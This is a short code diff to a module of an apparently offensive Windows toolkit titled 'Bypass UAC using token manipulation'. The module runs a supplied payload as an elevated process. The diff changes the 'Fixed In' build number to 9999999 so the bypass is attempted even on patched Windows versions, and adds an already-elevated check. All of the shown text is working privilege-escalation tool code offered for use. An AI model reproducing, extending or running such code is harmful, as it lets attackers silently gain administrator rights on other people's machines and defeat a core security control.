@@ -9,7 +9,8 @@ tokenmanipulation_info = {
 	"Description": "Bypass UAC using token manipulation",
 	"Id": "15",
 	"Type": "UAC bypass",
-	"Fixed In": "17686" if not information().uac_level() == 4 else "0",
+	#"Fixed In": "17686" if not information().uac_level() == 4 else "0",
+	"Fixed In": "9999999" if not information().uac_level() == 4 else "0",
 	"Works From": "7600",
 	"Admin": False,
 	"Function Name": "tokenmanipulation",
@@ -18,6 +19,10 @@ tokenmanipulation_info = {
 
 
 def tokenmanipulation(payload):
+	if information().admin():
+		print_error("Unable to proceed, we are already elevated")
+		return False
+		
 	if payloads().exe(payload):
 		print_info("Launching elevated process")
 		ShellExecute = ShellExecuteInfoW()
@@ -90,4 +95,3 @@ def tokenmanipulation(payload):
 			print_success("Successfully executed payload with PID: {}".format(lpProcessInformation.dwProcessId))
 	else:
 		print_error("Cannot proceed, invalid payload")
-		return False
